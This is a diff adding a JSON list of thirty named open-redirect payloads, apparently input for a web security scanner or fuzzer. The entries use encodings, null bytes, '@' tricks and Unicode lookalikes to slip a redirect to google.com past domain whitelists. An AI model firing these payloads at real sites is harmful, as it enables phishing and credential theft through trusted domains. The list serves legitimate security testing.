@@ -1,0 +1,121 @@
+[{
+		"name": "Basic Open Redirect",
+		"payload": "https://google.com"
+	},
+	{
+		"name": "Open redirect bypass using '//'",
+		"payload": "//google.com/"
+	},
+	{
+		"name": "'%09' Open redirect",
+		"payload": "%09.google.com"
+	},
+	{
+		"name": "Whitelisted domain using '%252e'",
+		"payload": "%252e.google.com"
+	},
+	{
+		"name": "Whitelisted domain injection open redirect",
+		"payload": ".google.com"
+	},
+	{
+		"name": "Open redirect bypass using 'https:'",
+		"payload": "https:google.com"
+	},
+	{
+		"name": "Open redirect bypass '//'",
+		"payload": "\/\/google.com/"
+	},
+	{
+		"name": "Open redirect bypass '//'",
+		"payload": "/\/google.com/"
+	},
+	{
+		"name": "Open redirect bypass Using '%E3%80%82' to bypass '.'",
+		"payload": "//google%E3%80%82com"
+	},
+	{
+		"name": "Open redirect bypass using null byte",
+		"payload": "//google%00.com"
+	},
+	{
+		"name": "Whitelisted domain open redirect bypass using '@'",
+		"payload": "@google.com/"
+	},
+	{
+		"name": "Whitelisted domain open redirect using special chars",
+		"payload": "https://ⓖⓞⓞⓖⓛⓔ.ⓒⓞⓜ"
+	},
+	{
+		"name": "Whitelisted domain open redirect with special chars and '%01'",
+		"payload": "%01https://ⓖⓞⓞⓖⓛⓔ.ⓒⓞⓜ"
+	},
+	{
+		"name": "Open redirect bypass using '%01'",
+		"payload": "%01https://google.com"
+	},
+	{
+		"name": "Open redirect bypass using special chars and '////%09'",
+		"payload": "////%09/ⓖⓞⓞⓖⓛⓔ.ⓒⓞⓜ"
+	},
+	{
+		"name": "Open redirect bypass using '//%09'",
+		"payload": "//%09/google.com"
+	},
+	{
+		"name": "Whitelisted domain open redirect using %2f",
+		"payload": "//%2f%2fgoogle.com"
+	},
+	{
+		"name": "Whitelisted domain open redirect using '%2f' and '$2f'",
+		"payload": "$2f%2fgoogle.com%2f%2f"
+	},
+	{
+		"name": "Whitelisted domain open redirect using %2f",
+		"payload": "%2fgoogle.com%2f%2f"
+	},
+	{
+		"name": "Whitelisted domain open redirect using '/%5c'",
+		"payload": "/%5cgoogle.com"
+	},
+	{
+		"name": "Whitelisted domain open redirect using '%5c' and '@' for redirection",
+		"payload": "////%5cwhitelisted.com@google.com"
+	},
+	{
+		"name": "Whitelisted domain open redirect using null byte injection",
+		"payload": "//google%00.com"
+	},
+	{
+		"name": "Open redirect bypass using '%252e'",
+		"payload": "google%252ecom"
+	},
+	{
+		"name": "Open redirect bypass using '<>//'",
+		"payload": "<>//google.com"
+	},
+	{
+		"name": "Open redirect bypass using '/<>//'",
+		"payload": "/<>//google.com"
+	},
+	{
+		"name": "Whitelisted domain open redirect using '//;@'",
+		"payload": "//;@google.com"
+	},
+	{
+		"name": "Whitelisted domain open redirect using '/.'",
+		"payload": "/.google.com"
+	},
+	{
+		"name": "Whitelisted domain open redirect using '/〱'",
+		"payload": "/〱google.com"
+	},
+	{
+		"name": "Whitelisted domain open redirect using '../'",
+		"payload": "../google.com"
+	},
+	{
+		"name": "Whitelisted domain open redirect using  '%2e%2e'",
+		"payload": "//google.com/%2e%2e"
+	}
+]
